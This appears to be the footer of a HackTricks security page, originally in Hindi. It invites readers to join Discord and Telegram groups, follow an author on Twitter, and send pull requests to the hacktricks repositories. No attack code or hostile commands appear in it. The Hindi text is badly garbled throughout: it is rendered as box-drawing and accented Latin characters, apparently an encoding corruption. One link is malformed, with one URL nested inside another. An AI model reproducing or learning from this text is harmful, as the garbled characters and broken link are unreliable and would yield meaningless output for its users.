* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>
